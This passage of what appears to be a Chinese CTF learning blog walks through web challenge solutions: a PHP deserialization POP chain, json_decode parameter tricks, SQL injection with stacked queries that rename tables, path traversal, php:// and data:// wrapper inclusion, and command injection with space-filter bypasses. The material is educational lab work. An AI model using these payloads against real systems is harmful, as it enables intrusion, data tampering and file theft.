        <content type="html"><![CDATA[<p>再解释源代码之前，我们需要先了解一下这个php的魔术方法</p><p>在解释源代码之前，我们需要先了解一下这个php的魔术方法</p><blockquote><ol><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol></blockquote><p>然后再来看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;.&#x2F;xxxiscc.php&quot;);class boy &#123;public $like;public function __destruct() &#123; echo &quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;; @$this-&gt;like-&gt;make_friends();&#125;public function __toString() &#123; echo &quot;拱火大法好&lt;br&gt;&quot;; return $this-&gt;like-&gt;string;&#125;&#125;class girl &#123;private $boyname;public function __call($func, $args) &#123; echo &quot;我害羞羞&lt;br&gt;&quot;; isset($this-&gt;boyname-&gt;name); &#125;&#125;class helper &#123;private $name;private $string;public function __construct($string) &#123; $this-&gt;string &#x3D; $string;&#125;public function __isset($val) &#123; echo &quot;僚机上线&lt;br&gt;&quot;; echo $this-&gt;name;&#125;public function __get($name) &#123; echo &quot;僚机不懈努力&lt;br&gt;&quot;; $var &#x3D; $this-&gt;$name; $var[$name]();&#125;&#125;class love_story &#123;public function love() &#123; echo &quot;爱情萌芽&lt;br&gt;&quot;; array_walk($this, function($make, $colo)&#123;   echo &quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;;   if ($make[0] &#x3D;&#x3D;&#x3D; &quot;girl_and_boy&quot; &amp;&amp; $colo &#x3D;&#x3D;&#x3D; &quot;fall_in_love&quot;) &#123;     global $flag;     echo $flag;   &#125; &#125;);&#125;&#125;if (isset($_GET[&quot;iscc&quot;])) &#123;$a&#x3D;unserialize($_GET[&#39;iscc&#39;]);&#125; else &#123;highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当这个php代码开始走的时候，先是__destruct()魔术方法被触发，然后echo出句子，当进行到</p><p><strong>$this-&gt;like-&gt;make_friends();</strong>  发现它调用了一个make_friends方法，但是这个方法不存在，所以触发call()魔术方法，在__call()中,echo出句子后，进行**isset($this-&gt;boyname-&gt;name);**会发现其触发了____isset()魔术方法</p><p>因为我们可以从代码里看到这俩个属性都是私有的，不可访问。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922222.png"></p><p>那么我们继续走，当进行isset()魔术方法时，echo出它的句子，然后发现其**echo $this-&gt;name;**发现name前没加$，意思为name被当成字符串，所以会发现其触发__toString()魔术方法</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922283.png"></p><p>echo出句子，然后进行<strong>return $this-&gt;like-&gt;string;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922390.png" alt="image-20230514203808378"></p><p>string是类helper里的成员变量。所以触发了__get()魔术方法。echo出句子后</p><p>   $var &#x3D; $this-&gt;$name;<br>    $var 【$name](); 从当前对象实例中获取一个变量，使用$name变量中指定的变量名称。然后，它尝试调用检索到的变量上的方法，使用相同的$name值作为方法名。（还是有点不太清楚）然后就是往下走类。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922316.png"></p><p>满足$colo强等于”fall_in_love”,且数组[0]&#x3D;”girl_and_boy”;</p><p>所以就可以构建出一个链表并以此来写出PHP代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">class boy&#123; public $like;&#125;class girl&#123; public $boyname;&#125;class helper&#123; public $name; public $string; public function __construct()&#123;     $this-&gt;string&#x3D;array(&quot;string&quot;&#x3D;&gt;array(new love_story(),&quot;love&quot;)); &#125;&#x2F;&#x2F;这是一个公共函数构造器（__construct），它需要一个字符串作为参数。在函数内部，将传入的字符串赋值给类的属性 $this-&gt;string。其中包含一个名为 &quot;string&quot; 的属性，它是一个数组，该数组包含了一个新的 love_story 对象和一个字符串 &quot;love&quot;&#125;class love_story&#123; public $fall_in_love&#x3D;array(0&#x3D;&gt;&#39;girl_and_boy&#39;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上半部分就是将类进行书写。以及满足love_story类中的条件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$b1 &#x3D; new boy();$b &#x3D; new boy();$g &#x3D; new girl();$h1 &#x3D; new helper();$h &#x3D; new helper();$l &#x3D; new love_story();$h-&gt;string&#x3D;array(&quot;string&quot;&#x3D;&gt;array(new love_story(),&quot;love&quot;));$b-&gt;like&#x3D;$h;$h1-&gt;name&#x3D;$b;$g-&gt;boyname&#x3D;$h1;$b1-&gt;like&#x3D;$g;echo serialize($b1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下半函数就是我们的链表，也就是上面我所说的按照那个顺序一步一步走，最后到达</p><p><strong>$h-&gt;string&#x3D;array(“string”&#x3D;&gt;array(new love_story(),”love”));</strong> 然后get传参iscc&#x3D;序列化后的结果，得到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300923309.png"></p><p>从这些被echo的句子也能看出链表。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB POP链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php中json_decode函数</title>
      <link href="/2023/05/31/php%E4%B8%ADjson-decode%E5%87%BD%E6%95%B0/"/>
      <url>/2023/05/31/php%E4%B8%ADjson-decode%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h2><h3 id="json-decode函数"><a href="#json-decode函数" class="headerlink" title="json_decode函数"></a>json_decode函数</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311939562.png"></p><p>JSON 字符串 ：</p><p>JSON 中的字符串必须用双引号包围。</p><p>例如       {“ctf”:”play”}    俩字符串用:隔开</p><p>JSON 数字 ：</p><p>JSON 中的数字必须是整数或浮点数。</p><p>例如        {“ctf”:100}</p><p>在 JSON 中，值必须是以下数据类型之一：字符串，数字，对象(json对象)，数组，布尔，null</p><p>不可以为以下数据类型之一： 函数，日期，undefined</p><h3 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h3><p>在PHP中   json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p><p>代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$json &#x3D; &#39;&#123;&quot;ctfer&quot;:&quot;sanmao&quot;,&quot;ctf&quot;:&quot;misc&quot;,&quot;age&quot;:18,&quot;bisai&quot;:14,&quot;champion&quot;:5&#125;&#39;;var_dump(json_decode($json));&#96;var_dump(json_decode($json, true));&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例演示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311948136.png"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h3 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[[SWPUCTF 2021 新生赛] jicao]"></a>[[SWPUCTF 2021 新生赛] jicao]</h3><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(&#39;index.php&#39;);include(&quot;flag.php&quot;);$id&#x3D;$_POST[&#39;id&#39;];$json&#x3D;json_decode($_GET[&#39;json&#39;],true);if ($id&#x3D;&#x3D;&quot;wllmNB&quot;&amp;&amp;$json[&#39;x&#39;]&#x3D;&#x3D;&quot;wllm&quot;)&#123;echo $flag;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题需要进行一个post传参，一个get传参，post传参很简单，在Max HackBar或者在BP里传入 id&#x3D;wllmNB</p><p>但是get传参则需要通过调用 PHP 内置函数 json_decode()，将字符串解析为一个关联数组，第二个参数 true 表示将解析结果以数组形式返回。最终将解析得到的数组赋值给变量 $json，可以在后续的代码中使用。</p><p>即构造 url+&#x2F;?json&#x3D;{“x”:”wllm”}   即上面所学json对字符串的值</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311954553.png"></p><p>即可得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> php基础，代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUWeb刷题记录</title>
      <link href="/2023/04/23/BUUWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/23/BUUWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><h3 id="一、本题做题思路"><a href="#一、本题做题思路" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题打开后是一个登录网站，结合题目所给提示，考虑应该是SQL注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231457412.png"></p><p> 看一下源代码，发现是get传参，和要加上check.php</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231459936.png"></p><p> 判断下闭合方式,发现是‘闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231502368.png"></p><p> 结合其为登录页面，尝试一下万能密码得到flag。</p><blockquote><p>payload：url+&#x2F;check.php?username&#x3D;1&amp;password&#x3D;admin’or’1&#x3D;1</p></blockquote><p> 也可以选择直接在页面的用户名和密码上输入admin’or’1&#x3D;1。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231510964.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点"><a href="#二、本题知识点" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> <strong>万能密码</strong>   可以看这位大佬的博客：<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">大佬博客</a></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><h3 id="一、本题做题思路-1"><a href="#一、本题做题思路-1" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>页面就是一个简单撸猫画面，所以查看源代码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041722891.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041722721.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>在查看源代码时拉到最下面，发现一串代码审计内容，所以通过修改payload得到flag</p><blockquote><p>payload: url+&#x2F;?cat&#x3D;dog </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041723676.png"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="一、本题做题思路-2"><a href="#一、本题做题思路-2" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开以后就是一个滑稽笑脸，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041723660.png"></p><p>通过查看源代码找到线索，去线索里看一看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724631.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还有一个线索可以去<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 进入这个php得到线索，返回source.php进行代码审计</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];&#x2F;&#x2F;定义了白名单            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#39;t see it&quot;;                return false;            &#125;            &#x2F;&#x2F;判断 当page存在或者page是字符串时，返回true            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            &#x2F;&#x2F;白名单过滤,需要传入的page中由source.php或者hint.php            $_page &#x3D; mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            &#x2F;&#x2F;mb_substr() 函数返回字符串的一部分,返回到0到mb_strpos的内容。            &#x2F;&#x2F;mb_strpos() 查找字符串在另一个字符串中首次出现的位置            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            &#x2F;&#x2F;查看page是否存在在白名单里面            $_page &#x3D; urldecode($page);            &#x2F;&#x2F;对page进行一次decode解码             $_page &#x3D; mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            &#x2F;&#x2F;与上面一样，查看俩个?之间的内容            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            &#x2F;&#x2F;查看是否存在白名单            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;    &#125;  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 所以构造payload，得到flag</p><blockquote><p>payload: url+&#x2F;?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725779.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><h3 id="一、本题做题思路-3"><a href="#一、本题做题思路-3" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开后就是一个tips</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725568.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>点开后查看源代码也没得到什么线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725580.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">结合上面的payload，考虑到php伪协议，所以可以构建payload</p><blockquote><p>url+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 对其进行编码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725590.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-1"><a href="#二、本题知识点-1" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>常见的五种PHP伪协议</p><p><strong>（1）php:&#x2F;&#x2F;input (碰到file_get_contents()可以通过此绕过)</strong></p><blockquote><p>用法：?file &#x3D;php:&#x2F;&#x2F;input  使数据利用post传过去</p></blockquote><p><strong>（2）php:&#x2F;&#x2F;filter (用来读取文件内容)</strong></p><blockquote><p>用法：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</p><p>​      ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</p></blockquote><p><strong>(3) zip:&#x2F;&#x2F; (可以访问压缩包里的内容)</strong></p><blockquote><p>用法:  zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内的文件]</p><p>​      ?file&#x3D;zip:&#x2F;&#x2F;D:\zip.zip%23phpinfo.txt</p></blockquote><p><strong>(4) phar:&#x2F;&#x2F; (与zip:&#x2F;&#x2F;相同)</strong></p><blockquote><p>用法: ?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php (zip要用#隔开，这个用&#x2F;)</p></blockquote><p><strong>(5) data:&#x2F;&#x2F; (读取文件)</strong></p><blockquote><p>用法: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?><br>     ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;<br>     ?file&#x3D;data:text&#x2F;plain,<?php phpinfo()?><br>     ?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p></blockquote><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h3 id="一、本题做题思路-4"><a href="#一、本题做题思路-4" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>结合打开网站所给提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041726553.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先ping一下本地网址，查询所有</p><p><strong>payload: 127.0.0.1;ls &#x2F;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041726558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>看到flag，尝试获取他，通过cd可以达到访问上一个目录的目的</p><p>所以可以构造 <strong>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag</strong> 得到flag</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="一、本题解题思路"><a href="#一、本题解题思路" class="headerlink" title="一、本题解题思路"></a>一、本题解题思路</h3><p>打开页面根据网站名字，是sql注入，所以尝试下注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727066.png"></p><p>尝试通过select，发现过滤掉很多关键词</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727048.png"></p><p>基本上不考虑联合注入，报错注入了，可以尝试堆叠注入，</p><p>先判断是什么闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727995.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727980.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 是’闭合，所以通过此来进行堆叠注入爆库  <strong>1’;show tables– q</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728364.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现两张表，尝试一下爆表,先爆words  <strong>1’;show columns from <code>words</code>– q</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728398.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>再尝试下爆190那个表  <strong>1’;show columns from <code>1919810931114514</code>– q</strong>  发现有flag线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728905.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 但是，如果要接着直接查这个flag就会出现问题了，select等关键词被过滤了，所以我们只能另辟蹊径，根据从网上大佬的wp学习，可以将<strong>1919810931114514</strong>改名为<strong>words</strong>这个表，然后再将<strong>words</strong>这个表改成其他名字，添加<strong>id</strong>字段，将<strong>flag</strong>改为<strong>data</strong>，最后通过系统的select帮我们查出flag具体代码如下:</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">1&#39;;rename table words to word2;rename table &#96;1919810931114514&#96; to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;12&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>然后通过  <strong>1’ or 1&#x3D;1;#</strong>  直接得到flag。如果不放心，你也可以通过上面的爆表，爆库确认一下是否改名成功，有所变化。</p><h3 id="二、本题知识点-2"><a href="#二、本题知识点-2" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>(1)、为什么再爆库，爆表时候要用&#96;&#96;包住表</p><p><strong>反单引号：它是为了区分MySQL的保留字与普通字符而引入的符号。当表名、字段名为一些保留字的时候，如果不用反单引号标注，执行SQL的时候会报错。数据库、表、索引、列和别名用的是引用符是反单引号。</strong></p><p>(2)、<a href="https://blog.csdn.net/qq_45927819/article/details/123594626">大佬博客</a> 对堆叠注入原理和触发条件做了解释，并以此题为例题进行讲解。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="一、本题解题思路-1"><a href="#一、本题解题思路-1" class="headerlink" title="一、本题解题思路"></a><strong>一、本题解题思路</strong></h3><p> 从本题题目猜测大概和Exec那题差不多，打开网页发现只是需要通过get传参来进行ping</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730254.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 跟上题一样先查询一下，得到flag线索 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;ls</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730276.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>尝试抓取一下这个flag。 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat flag</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730237.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现他将空格过滤了，不过通过网上学习，发现可以用一些字符绕过空格，例如 <strong>$IFS$9  ${IFS} %09 等 ，</strong>所以我们尝试拼接url一下来重新抓取flag。 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat${IFS}flag</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731227.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">应该是还过滤一些符号，这里可能过滤{},所以我们换个空格绕过字符: </p><p> <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9flag</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731195.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现其过滤flag这个字符。只能再回头看看线索了，当时不仅有flag.php,还有一个index.php。所以我们可以去查看一下这个 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9index.php</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731211.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现里面过滤了很多字符，不过定义了一个变量**$a<strong>，可以通过这个</strong>$a**完成绕过</p><p>拼接url:  <strong>url+&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php。</strong>访问后从源代码找到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731199.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> <strong>二、本题知识点</strong></p><p> (1)、<strong>空格绕过</strong>，本题除了我上面所说的那几天空格绕过方法，还有类似于 <strong>&lt;&gt; ${IFS &lt; %20</strong>以及我上面所说的那几个。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="一、本题做题思路-5"><a href="#一、本题做题思路-5" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>结合题目又是一道sql注入题， </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733865.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>先判断下闭合方式，发现用’闭合时回显为空白，用”闭合回显为nonono，猜测为’闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733861.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img 